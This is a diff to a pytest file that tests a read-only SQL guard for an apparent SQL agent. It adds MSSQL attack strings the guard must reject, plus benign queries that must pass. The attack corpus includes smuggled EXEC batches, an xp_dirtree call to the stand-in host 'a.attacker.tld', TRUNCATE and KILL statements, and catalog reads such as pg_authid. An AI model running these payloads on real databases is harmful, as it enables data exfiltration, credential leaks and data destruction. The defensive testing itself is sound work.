@@ -133,6 +133,13 @@ MSSQL_ATTACKS = [
     "SELECT * FROM t OUTER APPLY fn_xe_file_target_read_file('c:/x', NULL, NULL, NULL) f",
     "SELECT SUSER_SNAME(), HAS_DBACCESS('x'), IS_SRVROLEMEMBER('sysadmin')",
     "SELECT NEWID()", "SELECT ::fn_helpcollations()",
+    # 5.8b security review: a batch's second statement read by sqlglot as a table alias
+    "SELECT region FROM sales EXEC('SELECT 1')", "SELECT region FROM sales EXECUTE('x')",
+    "SELECT region FROM sales EXEC('EXEC master..xp_dirtree ''\\\\a.attacker.tld\\x''')",
+    "SELECT a FROM (SELECT 1 a) t EXEC('x')", "WITH c AS (SELECT 1 a) SELECT a FROM c EXEC('x')",
+    "SELECT 1 a UNION SELECT 2 EXEC('x')", "SELECT a FROM t RAISERROR('x', 16, 1)",
+    "SELECT a FROM t KILL 52", "SELECT a FROM t CHECKPOINT", "SELECT a FROM t RECONFIGURE",
+    "SELECT a FROM t TRUNCATE TABLE t", "SELECT a FROM t exec('x')",
 ]
 
 
@@ -154,6 +161,9 @@ def test_the_mssql_attack_corpus_is_rejected_by_the_parse_guard_alone(sql):
     "SELECT EOMONTH(d), DATEFROMPARTS(2025, 1, 1), DATETRUNC(month, d) FROM t",
     "SELECT PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY x) OVER () FROM t",
     "WITH x AS (SELECT 1 AS a) SELECT a FROM x",
+    # reserved words as quoted names or text are names and text, not statements
+    "SELECT [exec], \"update\", 'EXEC(1)' AS note FROM t",
+    "SELECT a FROM t ORDER BY a OFFSET 10 ROWS FETCH NEXT 5 ROWS ONLY",
 ])
 def test_ordinary_mssql_analytics_is_not_over_blocked(sql):
     assert g.check_sql_readonly(sql, dialect="tsql") is None
@@ -313,6 +323,21 @@ def test_a_function_not_on_the_allow_list_is_refused(sql, dialect):
     name missing. Now anything off the list is refused, named."""
     reason = g.check_sql_readonly(sql, dialect)
     assert reason and "not allowed" in reason, (sql, reason)
+
+
+@pytest.mark.parametrize(("sql", "dialect", "hard"), [
+    ("SELECT my_fn(a) FROM sys.objects", "tsql", "the database's own tables are not readable: sys"),
+    ("SELECT pg_read_file('x') FROM pg_catalog.pg_authid", "postgres",
+     "the database's own tables are not readable: pg_catalog"),
+    ("SELECT pg_terminate_backend(1) FROM t WITH (TABLOCKX)", "tsql",
+     "table hints that take locks are not allowed: TABLOCKX"),
+    ("SELECT my_fn(a) FROM t FOR UPDATE", "postgres", "row locks (FOR UPDATE/SHARE) are not allowed"),
+])
+def test_a_hard_refusal_wins_over_a_function_refusal(sql, dialect, hard):
+    """5.8b audit (silent-failure hunter): the walk returned the first problem, so a function off
+    the list (a soft refusal the SQL agent retries) hid a catalog read or a lock: a second paid
+    try, and the attempt left out of the read-only trace."""
+    assert g.check_sql_readonly(sql, dialect) == hard
 
 
 @pytest.mark.parametrize(("sql", "dialect", "reason"), [
